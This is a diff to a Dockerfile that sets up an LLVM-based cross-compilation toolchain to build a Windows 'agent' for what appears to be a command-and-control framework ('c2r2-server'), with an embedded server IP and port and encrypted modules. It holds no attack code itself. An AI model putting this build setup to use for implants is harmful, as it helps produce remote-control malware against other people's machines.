@@ -13,7 +13,14 @@ RUN apt-get update && apt-get install -y \
     build-essential \
     gcc-aarch64-linux-gnu \
     g++-aarch64-linux-gnu \
+    cmake \
+    nasm \
+    llvm \
+    lld \
     && rm -rf /var/lib/apt/lists/*
+
+# Configurar llvm-rc como rc.exe para que winres funcione
+RUN ln -s /usr/bin/llvm-rc /usr/bin/x86_64-w64-mingw32-windres || true
 
 # Agregar target de Windows
 RUN rustup target add x86_64-pc-windows-gnu
@@ -86,7 +93,12 @@ RUN mkdir -p /build_output/modules && \
     cp c2r2-server/modules/*.key /build_output/modules/ 2>/dev/null || true && \
     echo "✅ Módulos encriptados copiados a /build_output/modules"
 
-# 7. Compilar el agente con configuración específica
+# 7. Configurar variables de entorno para winres con llvm-rc
+ENV RC=llvm-rc \
+    AR_x86_64_pc_windows_gnu=llvm-ar \
+    WINDRES_x86_64_pc_windows_gnu=llvm-rc
+
+# 8. Compilar el agente con configuración específica
 RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." && \
     if [ "$PRODUCTION_MODE" = "true" ]; then \
         /build_output/builder build-agent \
